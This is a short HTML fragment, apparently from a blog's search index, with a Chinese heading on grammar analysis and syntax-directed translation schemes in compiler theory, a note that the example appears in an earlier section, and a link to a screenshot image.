<h3 id="2-1文法分析（语法制导的翻译方案）（为语法制导的定义的一种实现）"><a href="#2-1文法分析（语法制导的翻译方案）（为语法制导的定义的一种实现）" class="headerlink" title="2.1文法分析（语法制导的翻译方案）（为语法制导的定义的一种实现）"></a>2.1文法分析（语法制导的翻译方案）（为语法制导的定义的一种实现）</h3><blockquote>
<p>2小节已给出例子</p>
</blockquote>
<p><img src="/../../../themes/diaspora/source/img/mypic/com/image-20240909214050071.png" alt="image-20240909214050071"></p>
]]></content>
  </entry>
</search>
